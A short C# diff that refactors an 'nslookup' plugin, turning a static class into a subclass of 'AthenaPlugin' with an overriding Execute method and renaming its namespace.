@@ -5,11 +5,11 @@ using System.Text;
 using PluginBase;
 using System.Linq;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class nslookup
+    public class Plugin : AthenaPlugin
     {
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             StringBuilder sb = new StringBuilder();
 
@@ -72,9 +72,7 @@ namespace Plugin
                 task_id = (string)args["task-id"],
             });
         }
-
-        
-        private static IEnumerable<string> GetTargetsFromFile(byte[] b)
+        private IEnumerable<string> GetTargetsFromFile(byte[] b)
         {
             string allData = System.Text.Encoding.ASCII.GetString(b);
 
